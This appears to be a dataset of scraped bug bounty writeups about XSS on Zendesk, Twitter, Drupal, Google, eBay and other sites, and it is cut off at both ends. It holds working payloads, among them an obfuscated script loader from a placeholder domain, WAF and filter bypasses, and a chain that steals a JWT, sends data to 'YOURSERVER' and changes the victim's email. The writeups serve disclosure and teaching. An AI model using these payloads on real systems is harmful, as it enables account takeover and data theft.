()%2B%22%22)[2]%3BDOT%20=%20(%2B(%2211E100%22)%2B[])[1]%3BSLA=(![]%2B[%2B![]])[([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B(!![]%2B[])[%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B([][(![]%2B[])[%2B[]]%2B([![]]%2B[][[]])[%2B!%2B[]%2B[%2B[]]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B[]]%2B(!![]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B!%2B[]]]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]]()[%2B!%2B[]%2B[%2B[]]]%3B[][F%2BI%2BL%2BL][C%2BO%2BN%2BS%2BT%2BR%2BU%2BC%2BT%2BO%2BR](S%2BE%2BT%2B%22T%22%2BI%2BM%2BE%2BO%2BU%2BT%2B%22(%22%2BF%2BU%2BN%2BC%2BT%2BI%2BO%2BN%2B%22()%7B%20$%22%2BDOT%2BG%2BE%2BT%2B%22S%22%2BC%2BR%2BI%2BP%2BT%2B%22('%22%2BSLA%2BSLA%2B%22BADASSDOMAIN%22%2BDOT%2B%22COM%22%2BSLA%2B%22BADASSURL')()%3B%20%7D,%203000)%3B%22)()%3B(%22 We loaded our external JS and our external JS was able to change the username password!, account takeover , severity raised from low (simple alert XSS), to High (account takeover) and bug bounty raised from 50 to 1000 USD, 20 times higher . special thanks to Martin Kleppe . This wouldn’t be possible without their javascript discoverments. Xss Attack Xss Bypass Xss Vulnerability Bug Bounty Hackerone -- -- 3 Written by Master SEC 131 followers · 2 following It Security company from Argentina. Penetration Testing, Red Team, Bug Bounty, Training. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@hariharan21/stored-xss-on-zendesk-via-macros-part-2-676cefee4616", "title": "Stored XSS on Zendesk via Macro’s PART 2 | by Hariharan S | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@hariharan21/stored-xss-on-zendesk-via-macros-part-2-676cefee4616. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS on Zendesk via Macro’s PART 2 | by Hariharan S | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS on Zendesk via Macro’s PART 2 Hariharan S 2 min read · Sep 20, 2019 -- 1 Listen Share Hi Guys, This is the continuation of my first write of Stored XSS Via Alternate Text At Zendesk Support . So let's get back to business..As i was investing the XSS issue on the platform i noticed that the XSS Popup was triggered TWO times on the homepage. So i searched for the endpoint where the XSS payload got executed. But no luck, So i removed my payload from the first vulnerable endpoint that is the Alternate Url Text and checked the homepage. To my suprise the XSS pop triggered as usual but this time it pop’d up only ONCE . So i look up the macro if i had entered the payload anywhere else and of course i had entered a payload on the macro description field . So i found an another vulnerable endpoint. Time for POC. For POC purposes i created a fresh macro and entered the payload on the macro description field and click on save…A Web Application Firewall(WAF) came smiling upon me Saying “ YOU HAVE BEEN BLOCKED”. WAF BYPASS TIME!!!!!!!!!!!!!!! After learning about the working of the WAF i found out a “Not so Complicated” Method to bypass It. Don't Enter the payload in beginning itself while creating the macro. Instead while creating the macro just enter random things in the description and after creating the macro edit the description and enter the payload. Shorter version : WAF only scans the content that is entered the first time and does not care what you enter afterwards . Press enter or click to view image in full size After this BYE BYE WAF. The payload got saved successfully and also got triggered on the homepage. Report Timeline : Aug 10th- Report Submitted Aug 11th- Closed as duplicate of my first report Aug 17th- Report reopened after providing info that the two xss issues are different Aug 23rd- Bounty Time $$$ Aug 26th- Resolved and Got listed on their HOF Few Things to Say.. Check the number of XSS triggers ( Number of XSS triggers = Number of Vulnerable endpoints) Try to Bypass the WAF by not only changing the payload. 3. The payload that i used is <img src=x onerror=alert(document.cookie)> MAY THE BUGS BE WITH YOU, P5YCH0(@Neo_X37) Security Bug Bounty Xss Vulnerability Xss Bypass Xss Attack -- -- 1 Written by Hariharan S 95 followers · 0 following In my experience, there’s no such thing as luck. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@hungrybytes/xss-to-rce-in-e20b2bc55f94", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@hungrybytes/xss-to-rce-in-e20b2bc55f94. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@bywalks/xss-on-twitter-worth-1120-914dcd28ee18", "title": "XSS On Twitter [Worth 1120$]. Hi guys, this is the first writeup… | by Bywalks | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@bywalks/xss-on-twitter-worth-1120-914dcd28ee18. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS On Twitter [Worth 1120$]. Hi guys, this is the first writeup… | by Bywalks | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS On Twitter [Worth 1120$] Bywalks 3 min read · Jul 22, 2019 -- 2 Listen Share Hi guys, this is the first writeup about my vulnerability bounty program,a process about how I discovered a Twitter XSS vulnerability. I think that in the process of finding the vulnerability, there are some interesting knowledge points, I hope you can get some from my writeup. If you want to know more details, you need to visit bobrov’s blog , my discovery is due to reading his writeup, and thanks bobrov very much,I have a lot of gains from his blog. Maybe you don’t want to spend more time. Here I will give a brief explanation of his article. When you visit some addresses, the server returns 302, which is similar to the following picture. Press enter or click to view image in full size In the returned Body, location will choose how to populate according to the requested URL,and the requested URI will be placed in the href event. What do you think of next? Can we try it with dev.twiiter.com//javascript:alert(‘1’);/ indeed, as you might expect, <a href=”javascript:alert(‘1’);/”> Xxx</a> will be in the return body,but the returned location is location:javascript:alert(‘1’);/ ,The browser does not play the box So, bobrov did a lot of fuzz, trying to get around the limitations here, amazing, he did, his Fuzz process is as follows (taken from his blog) Press enter or click to view image in full size So, his final Payload is https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie) and the response from the server is as follows.Location header = //aa :1/:/dev.twitter.com/%01xxx . returned body = <a Href=”javascript:alert(document.cookie)”>xxx</a>. Seeing this, you may be wondering, is this a problem?Javascript only works when the a tag is clicked,and the location header is http:////aa:1/:/dev.twitter.com/%01xxx, does the browser not jump? There is a key point in this.When you visit a website, usually, the port you access is 80 or 8080,if you enter the port address as 1, the browser will not jump.Here, it is the a tag. The click was made possible, so we can combine the issue via Clickjacking,let the victim trigger this XSS vulnerability After introducing his findings, let me talk about how I found this problem again.Honestly, I have been paying attention to Twitter security for a while,but I have gained very little,so I put my eye on Twitter’s past vulnerability report to see if there are some problems in the Twitter fix. When I saw bobrov writeup about the problem,I immediately visited dev.twtter.com to try to find out if there were some problems.When I collected information through Google, I found an extremely interesting link. https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/basics/adding-international-support-to-your-apps Look closely, do you find it interesting? My feeling tells me that there may be problems here.So I tried to go to Fuzz to confirm my guess.After a period of testing, I found that when I added a / at the end of the URL,a miracle happened, for example,when I visited https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/http://www.bywalks.com/, location= http://www.bywalks.com ,href= http://www.bywalks.com Yes,Twitter’s fix for this issue no longer exists. Finally,after a period of Fuzz, my final Payload was https://dev.twitter.com//web%2f:1/:///%01javascript:alert(1)/ and I got Twitter 1120$ rewards My gains in the process: 1: Don’t give up on the exploitation of a large company’s loopholes, insist that there will always be gains 2: When accessing a 302 jump page, location header and link on page extracting Url in different ways, there may be problems here. 3: When the browser tries to access a website with a port of 1, it will not jump I hope that you can make some gains from my writing and sorry I m a non English speaker best wishes, Bywalks Twitter Bug Rewards Programs Xss Attack -- -- 2 Written by Bywalks 63 followers · 2 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nahoragg/chaining-cache-poisoning-to-stored-xss-b910076bda4f", "title": "Chaining Cache Poisoning To Stored XSS | by Rohan Aggarwal | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nahoragg/chaining-cache-poisoning-to-stored-xss-b910076bda4f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nChaining Cache Poisoning To Stored XSS | by Rohan Aggarwal | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Chaining Cache Poisoning To Stored XSS Rohan Aggarwal 3 min read · Jul 28, 2019 -- 3 Listen Share O ne of the benefits of being a developer is that you can guess how stuff is working at the server end. You can try to debug how the developer might have coded a certain functionality or how he might have configured his application, especially in the case where the application is built in some framework or CMS . For example, many developers using Rails framework use Scaffold to quickly generate major pieces of application like model, views and controller in a single operation. Besides this, Scaffold also creates JSON API endpoint for each route automatically which is most of the time overlooked by the devs or they forgot to remove this JSON endpoint while pushing to production. So a dev who removed sensitive information from a normal route, might forget to remove the same from JSON endpoint of that route. Checking such misconfiguration might leak some sensitive data in a rails application. Therefore, having knowledge about the application technology really gives you differential findings than others. Recently, I came across a Drupal application in a bug bounty program on Hackerone. Since I’ve used drupal before, I started looking for some common misconfigurations related to drupal. And within 10 minutes, I found one. If you’ve developed on drupal before, you might know that it has it’s own internal caching system which is enabled by default . Easiest way to find whether caching is enabled is to look for x-drupal-cache header in the response. So you give unique key( endpoint + parameters ) in request and in response you get x-drupal-cache: MISS header but if you request again with that same key and you get x-drupal-cache: HIT header in the response, caching is enabled. To learn more about how caching works and its exploitation, read this by albinowax . After I came to knew that caching is enabled, one of the ways I can exploit is by poisoning the cache with XSS payload. But to do that I need to find an HTTP header that gets reflected in the response. Since drupal just like any other PHP framework sometimes supports X-Original-URL and X-Rewrite-URL headers because of Zend , I tried injecting these headers in request but sadly the application wasn’t accepting. What to do now? If nothing works, try brute-forcing . So I used a burp suite extension called Param Miner which will brute force common headers. After few seconds I got a hit. It found a header named style which was getting reflected in response. I quickly checked whether it’s vulnerable to XSS and it was. After that, I knew I can easily chain cache poisoning to stored XSS. I created a unique key & added style header with XSS payload and fired the request. Press enter or click to view image in full size The response with XSS payload is cached for the above unique request. Now whenever someone visits www.redacted.com/?q=admin&liec4897=1, our poisoned response will be served by drupal resulting in Stored XSS. That’s it. A simple drupal misconfiguration leads to Stored XSS. TIMELINE Jun 14, 2019 — Report Submitted Jun 15, 2019 — Triaged Jul 12, 2019 — Resolved Jul 13, 2019 — Rewarded If you found this post useful in any way, make it useful for others as well by sharing. More coming. Get Your Applications Tested Today at DefCore Security Bug Bounty Cache Poisoning Xss -- -- 3 Written by Rohan Aggarwal 444 followers · 1 following AppSec | BugBounty | Speaker | Game Hacking | Founder at Defcore Security Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://thesecurityexperts.wordpress.com/2019/07/11/xss-on-google-custom-search-engine/", "title": "XSS on Google Custom Search Engine – The Security Experts", "friendly_explanation": "This is a bug bounty writeup from https://thesecurityexperts.wordpress.com/2019/07/11/xss-on-google-custom-search-engine/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS on Google Custom Search Engine – The Security Experts Skip to content Search Search for: The Security Experts Bug Bounty POC Menu Home About Us Contact Open Search XSS on Google Custom Search Engine Product Affected: https://cse.google.com Vulnerability: XSS (Stored with user interaction) Every bug that ever reported have some realized or unrealized inspirations. It can be a person, bounty, write-up or anything. In my case the inspiration was Google Vulnerability Research Grant that was rewarded to me prior to BountyCon 2019. I started looking for subdomain and landed in https://cse.google.com . Google CSE (Custom Search Engine) gives you ability to create your own custom search engine for your website. Once you have created the custom search engine, you can view it with the following link. https://cse.google.com/cse?cx =<YOUR_ID>. It also allows you to add your own promotion URL to your custom search engine ( https://cse.google.com/cse/search/promotions?cx =<YOUR_ID> ). When the user search the promotion triggering keywords the ad URL will appear in top of search, just like Google. Now all you have to do now is add the most classic “ javascript:alert(0 )” to the promotion URL. Luckily it didn’t get filtered. So once you search the keyword and click on the promotion URL the alert will popup. Still complicated to exploit,as user want to enter the promotion triggering query manually. So did a bit of parameter guessing and it worked . https://cse.google.com/cse?cx =<YOUR_ID>?q=triggeringkeyword will automatically search the payload for you. Now all you have to do is, send the URL to the victim and he have to click on the promotion. TAAATAAAhh! XSS firesss! Couldn’t make URI based XSS wite-up any longer.. 🙂 Thanks, Sreeram Wait..Here is the GIF you were searching for.. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Like Loading... Related Published by Sree Ram KL View all posts by Sree Ram KL July 11, 2019 Uncategorized Post navigation Journey through Google referer leakage bugs. One thought on “ XSS on Google Custom Search Engine ” Add yours unicc dumps says: July 17, 2019 at 11:11 am Ιt’s awesome to ppaу a quick visit this site and reaɗing the views of all friends on the topic of hіѕ article, while I am also eager of gettikng knowledge. Like Like Reply Leave a comment Cancel reply Δ Search for: Create a website or blog at WordPress.com Up ↑ Privacy & Cookies: This site uses cookies. By continuing to use this website, you agree to their use. To find out more, including how to control cookies, see here: Cookie Policy Comment Reblog Subscribe Subscribed The Security Experts Sign me up Already have a WordPress.com account? Log in now. The Security Experts Subscribe Subscribed Sign up Log in Copy shortlink Report this content View post in Reader Manage subscriptions Collapse this bar Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d Design a site like this with WordPress.com Get started"}
{"source_url": "https://medium.com/@madguyyy/reflected-xss-in-ebay-com-60a9d61e26cd", "title": "Reflected XSS in Ebay.com. In Sept. 2013 I found Reflected XSS in… | by Sukhmeet Singh | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@madguyyy/reflected-xss-in-ebay-com-60a9d61e26cd. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS in Ebay.com. In Sept. 2013 I found Reflected XSS in… | by Sukhmeet Singh | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS in Ebay.com Sukhmeet Singh 3 min read · Jul 22, 2019 -- Listen Share Press enter or click to view image in full size In Sept. 2013 I found Reflected XSS in www.ebay.com. Why writing it up now? Because I didn’t want to “showoff” for reasons. Enough with the drama :D. Let’s get to the point. So I was looking at all the names in Hall of fame of different sites. On Ebay’s Security Researcher page, I thought the list is long but I want my name in the list. So I started playing with all the GET parameters and came to this possibly vulnerable page. URL: http://www.ebay.in/sch/Coins-Notes-/11116/i.html Vulnerable parameter: LH_SpecificSeller Reflected Code: <span style=\"display:none\"> <span title=' XSS HERE '> XSS HERE </span> </span> List of hurdles: < > and , are removed Affected area lies within hidden span ( display: none , no mouse events) Because parent span had CSS style display: none , it was not possible to trigger event. Neither it was possible to make the affected span visible because of the same reason. Though I tried it by adding style attribute. I tried all other payload, say it be onload / onerror events or data: URI in style attribute. But after a little research; OK OK after 8 hours of research I came upon a CSS expression payload . http://www.ebay.in/sch/Coins-Notes-/11116/i.html?LH_SpecificSeller=1..xss'+style=\"xss:expression(prompt(1))\"+id='1 Press enter or click to view image in full size Aaand it worked! Not in Firefox and Google Chrome, but in Internet Explorer. Yes I had to use Internet Explorer because of compulsion. But that was enough for me. So I reported it and after a month they fixed it and I got a reply from them. Press enter or click to view image in full size and that’s how I got my name in the list . Here it is. Bug Bounty EBay Whitehat -- -- Written by Sukhmeet Singh 41 followers · 6 following https://twitter.com/MadGuyyy No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@schopath/yeah-i-got-p2-in-1-minute-stored-xss-via-markdown-editor-7872dba3f158", "title": "Bug Bounty: Stored XSS via Markdown (I got P2 in 1 minute!) | by November Rain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@schopath/yeah-i-got-p2-in-1-minute-stored-xss-via-markdown-editor-7872dba3f158. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBug Bounty: Stored XSS via Markdown (I got P2 in 1 minute!) | by November Rain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bug Bounty: Stored XSS via Markdown (I got P2 in 1 minute!) November Rain 2 min read · Jul 2, 2019 -- 1 Listen Share Hello! I want to tell about my Bug Bounty Write-up, that was my fastest finding which has HIGH severity (P2). I discovered Stored XSS vulnerability when I was reporting another Bug Bounty report. The idiom says: Kill two birds with one stone. Okay, here we go! While thinking some words to make a report, I was thinking to create XSS payload in markdown editor (but I didn’t expect to be an XSS issue). At the end of my report, I added a XSS Payload : Cheers, [Schopath](https://schopath.ninja/\"/onmouseover=\"alert(/schopath/)\"/x=\"ZeroByte.ID) Then, I submit my report. What the … Boom! Gotcha! Really? It’s work! and I still don’t believe it. So many reports entered in that platform, only me who tried this? Debugger (F12) Press enter or click to view image in full size View Source (CTRL + U) Oh no, I’m just lucky kid After that, I started to create my P2 submission. Bonus! Markdown XSS payloads Images: ![\" onmouseover=\"alert(1);](https://img.uri/random.png) ![TEST](x\"/onerror=\"alert`/Oops/`) Anchor/URL/href: [TEST](javascript:alert(document.domain)) Thank you for reading. Bug Bounty Web Security -- -- 1 Written by November Rain 137 followers · 5 following A persistent of xchopath's brain-cache. https://novr.one | https://zerobyte.id . Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nandwanajatin25/story-of-a-stored-xss-to-full-account-takeover-vulnerability-n-a-to-accepted-8478aa5e0d8e", "title": "Story of a stored xss to full account takeover vulnerability(N/A to accepted) | by Jatin Nandwana | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nandwanajatin25/story-of-a-stored-xss-to-full-account-takeover-vulnerability-n-a-to-accepted-8478aa5e0d8e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStory of a stored xss to full account takeover vulnerability(N/A to accepted) | by Jatin Nandwana | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Jatin Nandwana 6 min read · Jul 4, 2019 -- Listen Share Story of a stored xss to full account takeover vulnerability(N/A to accepted) Hey everyone, This is one of my most best finds ever which took me some days to exploit but when I finally exploited it, it was the best feeling in the world!! So lets begin, I got a invite on a private program on hackerone and I started testing on it. As this was a private program I will use example.com instead of main program. This site was mainly for the purpose of group purposes so companies can share their data among other peoples and can invite other people having account on this site.During the initial testing I was looking for random bugs like csrf,xss,session misconfigs etc. And soon I found a stored xss bug. There was a functionality on the site to create some kind of mindmaps where we can store data for different purposes for memory recalling. And there were some templates to do this. And this was the request which got issued during creation of them, POST /endpoint Site: example.com {“tag1\":”abc”,”tag2\":”def”,”html”:”<div>blabla”} And this div took my attention, and I added a simple html tag like <b>test</b> and it rendered it properly. Now I tried something like <script>alert(6)</script> , it doesnt executed. Well xss can be executed in other ways as well using <image>,<iframe>,<svg> etc. I tried <image src=x onerror=alert(5)/> and alert popped up. And because of excitement of stored xss I reported this and this was the reply from them after 15 days. Press enter or click to view image in full size Woah! really! then how the pop-up came.I didnt want to argue much and start chaining it with other bugs I found on the site. There was a jwt token used as a csrf protection in the every sensitive requests which got changed after every 600 seconds I guess. Very secured right? Now the jwt tokens were stored not in cookies but in local html storage. Now the hacker inside me arised and I thought cant this be chained with the xss I found earlier to steal users information and I quickly remembered xmHttpRequest . Now as we can add javascript in onload handler of svg tags I prepared a quick poc to steal users information by first stealing jwt token from html storage and then adding it to auth request headers in the xmlhttprequest and this was my payload after some searching on xmlhttprequest and fetch api, POST /endpoint Site: example.com {“tag1”:”abc”,”tag2\":”def”,”html”:”<svg onload=\\”var token=localStorage.getItem(‘jwt’);var xhr=new XMLHttpRequest();xhr.open(‘GET’,’https:/example.com/api/v0/endpoint/’, true);xhr.setRequestHeader(‘Accept’, ‘application/json’);xhr.setRequestHeader(‘Content-Type’,’application/json; charset=utf-8');xhr.setRequestHeader(‘Authorization’, ‘Bearer ‘ + token);xhr.send();xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { alert(xhr.responseText); fetch(‘ https://YOURSERVER?q='+xhr.responseText);}};\\ \"/>\"} What this does is steals jwt token from local storage, make a xmlhttprequest to sensitive endpoint append the Authorization header(i,e jwt ) that was stolen, and sends the response with users sensitive information to our server through fetch api. But the hacker inside in me was not satisfied and I want to do a full account takeover. I though lets try. And from my initial testing I know that the application doesnt asks for password during email change and made a PATCH request like this with the auth header in request PATCH /email-change {“email”:”x@x.com”} As PATCH requests are allowed in xmlhttprequest I though lets give it a try. Now the real struggle came in. Firstly I want to tell you that in this PATCH request we require json data. And from above first payload you will see that the POST request itself contains a json payload. POST /endpoint Site: example.com {“tag1”:”abc”,”tag2\":”def”,”html”:”<PAYLOAD>”} New payload : <svg onload=\\”var token=localStorage.getItem(‘jwt’);alert(token);var xhr=new XMLHttpRequest();xhr.open(‘PATCH’,’https://site.com/v0/user', true);xhr.setRequestHeader(‘Accept’, ‘application/json’);xhr.setRequestHeader(‘Content-Type’,’application/json; charset=utf-8');xhr.setRequestHeader(‘Authorization’, ‘Bearer ‘ + token);var body= ’{“email”:”x@x.com”}’ ;xhr.send(parsed);xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { alert(xhr.responseText) }};\\”/> Elaborating more when I made this request with our payload in it, you will notice that first our whole payload is in html parameter of original json which is in and must be in double quotes(property of json), and inside that we have the svg payload which have onload handler which also have double quotes(ok, we will escape it with backslash), but there is also a PATCH request for the account takeover which have json data(double quotes necessary right) but we already have escaped double quotes outside in onload handler,(you must be thinking escape it with two backslash simple, ok done) now the site accepted the data but when I visited this place where stored xss was the PATCH request was not issued from xss probably because of two backslashes in json data. In console it was saying “literal contains an unescaped line break”. This is where I struggled for two days. WHAT WERE THE PROBLEMS I WAS FACING : Whenever I send a single quote in the json data of PATCH request inside onload handler the request failed saying “invalid json” Whenever I send a double quote in the json data of PATCH request inside onload handler the request accepted but the PATCH request in real xss failed. Now I was stuck from both the ends. I tried many different things and a lot of googling, stackoverflowing about this but was still unsuccessful and was always facing one of the two above problems. I even tried implementing single quoted json to convert it to double quoted during the run like this var body = {‘email’:’’x@x.com} body.replace(/’/g, ‘“‘) But this also failed as it also required the double quotes in replace function. I felt like quitting here. EVAL COMES TO THE RESCUE After 2 days and some more googling I found out there also a way to make single quoted json into double quoted json with eval. So you can convert single quoted json to double quoted json with eval without using double quotes anywhere, var test = {‘a’:’b’}; var new = eval(‘(‘ + test + ’)’); and then I felt I am prettly close, I made the new payload which have single quoted data inside body parameter and the evl function convert it to double quotes and then we <svg onload=\\”var token=localStorage.getItem(‘jwt’);var xhr=new XMLHttpRequest();xhr.open(‘PATCH’,’https://example.com/api/v0/user', true);xhr.setRequestHeader(‘Accept’, ‘application/json’);xhr.setRequestHeader(‘Content-Type’,’application/json; charset=utf-8');xhr.setRequestHeader(‘Authorization’, ‘Bearer ‘ + token);var body= ’{\\\\’email\\\\’:\\\\’x@x.com\\\\’}’;str = eval(‘(‘ + body + ‘)’);var parsed=JSON.stringify(str);xhr.send(parsed); xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { alert(xhr.responseText) }};\\”/> and sent the request got accepted. Woah!! passed the first stage, now when I loaded the the page where stored xss was there. The xss executed and no errors in console, I was like I have done that and in within a minute a confirmation email at our attackers email account received to verify the new email address for the account. I was so relaxed at that moment and also very happy at the same time. Finally after trying 100’s of payload and after 3–4 days I got the right payload for full account takeover. Probably I was weak in the basics of json implementation in javascript which took me so much time in making this payload worked, but the struggle was the real part where my hacking instints came up and I was like if this failed I should try this and finally the struggle paid off. Might be the good experts must have found this quickly but I really loved the struggle as it taught me to not give up till you think its possible. Now what this payload does is makes PATCH request to issue a new email for user , whoever visits that mindmap, the xss executes and changes his/her email to the attackers email. Vulnerabilities Chained => Stored xss + Jwt token in html local storage + No password protection on email change Finally they accepted this bug because of the account takeover poc I showed them and was awarded a good bounty by them.Always try to increase the impact of xss by chaining it with other bugs like token stealing,csrf, etc. XSS is more than an alert Thanks, Jatin Twitter : https://twitter.com/techyfreakk JavaScript Bug Bounty Hackerone Web App Security -- -- Written by Jatin Nandwana 131 followers · 1 following Web application pentester No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@iSecMax/сookie-based-xss-exploitation-2300-bug-bounty-story-9bc532ffa564", "title": "Сookie-based XSS exploitation | $2300 Bug Bounty story | by Max | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@iSecMax/сookie-based-xss-exploitation-2300-bug-bounty-story-9bc532ffa564. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nСookie-based XSS exploitation | $2300 Bug Bounty story | by Max | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Сookie-based XSS exploitation | $2300 Bug Bounty story Max 8 min read · Jul 17, 2019 -- 1 Listen Share Press enter or click to view image in full size For quite a long time I have been hunting for vulnerabilities on the HackerOne platform, allocating a certain amount of time outside the main work to check out my favorites and new programs. Countless times I had to stumble upon a cookie-based XSS vulnerability, which will become the main character of this article. This type of vulnerability occurs when the value of the cookie parameter is reflected on the page. By default, they are considered self-XSS if we, in our turn, do not prove their danger. Today I will tell you how to exploit cookie-based XSS vulnerabilities, and also give an example from one company testing, from which I received $7,300 in general for the research. In order to execute javascript on the user’s side, we need to find a way to set a cookie and, if necessary, lure the victim to a page where, in its turn, the cookie is embedded. Possible ways to exploit this bug: 1. CRLF injection. This vulnerability occurs when there is no proper checking and blocking of newline characters. We can inject a Set-cookie header in the response with the desired name, as well as the value of the cookie and set it in the browser. Real-life example: Slippery CRLF injection on twitter.com domain in the redirect, — https://twitter.com/login?redirect_after_login=/jjjkkk嘊嘍Set-Cookie:jjjjj=a;domain=twitter.com Reports about this type of vulnerability can be read on HackerOne https://hackerone.com/hacktivity?order_direction=DESC&order_field=popular&filter=type%3Apublic&querystring=crlf%20injection . 2. XSS vulnerability on a subdomain. It is necessary that XSS is publicly available and located on wildcard * .vulnerabledomain.com. For many bug bounty programs, subdomains are out of scope, i.e, in most cases, bugs are either not accepted at all, or are accepted but marked as “not eligible for the bounty”. In such cases, you should not retreat, but for the sake of a bunch with cookie-based XSS, you can invest your time searching for XSS to get a reward. If XSS is detected, we can set or remove cookies using the document.cookie function. Increasing Impact: Often the victim trusts the main domain vulnerabledomain.com more than, for example, jira.vulnerabledomain.com, and also with the URL /plugins/servlet/oauth/users/icon-uri?consumerUri=https://maliciousdomain.com. It is more likely that the victim will go to the main domain, rather than a subdomain, if this subdomain is not associated with a personal account or authorization. Based on the foregoing, we can use an in-site redirect functionality for redirecting to the subdomain https://vulnerabledomain.com/login?redirectUrl=https://jira.vulnerabledomain.com/path for the best effect. If the victim has an active session, the redirect will be automatic; — if not, authorization is needed. When the user clicks on such a link, the cookie will be set and from the subdomain, on which Reflected XSS is presented, it can be sent further downstream — to the cookie-based XSS page, where the exploit can trigger, which, in turn, will capture the CSRF token value and perform the request for changing the email address. Thus, a combination of two XSS vulnerabilities can lead to account takeover, if there are no associated problems, such as additional confirmation of changing email with a password or entering a code from an old mailbox. 3. Detection of test files that allow you to set cookies. It is enough to turn on the content discovery tool (dirb, dirserach, etc), start digging, and if the developers forgot to perform the cleanup, you can stumble upon such files. Recently I discovered a test servlet html page on which it was possible to set a cookie with an arbitrary name and value. Of course, there was no protection on the POST request, so if the victim would have visited the CSRF exploit (or you can change the POST to GET), it would be possible to set a cookie in her browser. This bug was qualified as an under-alternative to CRLF injection, fixed by removing /examples/ and paid $150 as for the low-severity bug. Although the h1 triager set medium, the developers were still tended to think that it was low severity. Press enter or click to view image in full size 4. Man in the middle attack (MITM). This method can be applied only if there is no secure flag on the cookie. If you don’t know what this flag is or just want to refresh your memory, I advise you to view the “Cookie security” presentation from OWASP London 2017 https://www.owasp.org/images/a/a0/OWASPLondon20171130_Cookie_Security_Myths_Misconceptions_David_Johansson.pdf . For a successful attack, it is necessary that the victim is located in the attacker’s network or the dns resolving can be influenced. In order to check the vulnerability, you must: 1) to host index.php file with the following content: <?php if ($_SERVER[‘HTTP_HOST’] == ‘non-existed-subdomain.vulnerabledomain.com’) { setrawcookie(“VID”,’\\’+alert(123123123)+\\’’, time() + 36000, “/”, “.vulnerabledomain.com”,0,1); } ?> 2) Add the following line to your /etc/hosts/ file: 127.0.0.1 non-existed-subdomain.vulnerabledomain.com 3) Visit non-existed-subdomain.vulnerabledomain.com and then open the page on which the cookie will be reflected. A remarkable example of MITM exploitation on e.mail.ru, — https://hackerone.com/reports/312548 , — as you can see, MITM was enough to prove a small level of vulnerability danger, but the reward did not match the level of Stored XSS, as there was shown only “local” exploitation example, not “in-the-wild”. If the researcher had spent some time searching for XSS or CRLF injection (which countless) on *.mail.ru, it would be possible to increase the reward greatly. But not all the hackerone programs accept cookie-based XSS via MITM. If scope exclusions say “Self XSS”, then this exploitation can be considered as Self XSS and report status can be changed to informative or n/a, which is not always pleasant. Now I will talk about a similar case that happened to me during the regular hunt on the platform. While testing the site, I suddenly noticed that the value of the **redacted** cookie is reflected in one of the subdirectories of the site. The first thing I checked is the displaying of the characters ’ “/<>. It turned out that only <> characters are filtered, which tells us that we cannot go beyond <script> </ script>, but it also becomes clear that the rest of the characters are not filtered. Without thinking for a long time, we embed ‘-alert(document.domain)-’ and js is executed. Since the developers did not give the cookie the secure flag, in this case the MITM method works. I decided to send the report to the program with the following impact: Press enter or click to view image in full size HackerOne staff (triager) made it clear that this is self-XSS and I should try-harder: Press enter or click to view image in full size After that, I began to surf the site and try to find CRLF injection or XSS to prove the danger. I had to expand the list of the subdomains with the help of brute-force with a large dictionary, scraping them with SSL certificates and with the help of some other tricks. The result was not long in coming, as I run most of the tools in VPS. From time to time 